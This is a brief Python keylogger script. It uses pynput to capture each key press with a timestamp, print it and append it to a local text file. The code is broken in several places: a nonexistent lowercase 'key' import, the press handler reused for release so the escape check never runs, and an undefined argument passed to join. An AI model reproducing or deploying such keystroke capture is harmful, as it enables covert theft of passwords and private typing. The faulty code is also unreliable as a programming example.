from pynput.keyboard import  key, Listener
import time

outputfile ="output.txt"

def onKeyPress(key):
    char = key
    currentTime = time.strftime("%H:%M:%S") 
    print(f'press: {key} \t at {currentTime}')
    with open(outputfile, "a+") as file:
        file.write(f'{key} \t at {currentTime}\n')
def onkeyrelease(key):
  print(f"Release") 
  if key == key.esc:
     return False
with  Listener(on_press = onKeyPress, on_release = onKeyPress) as listener:
   listener.join(key)
     

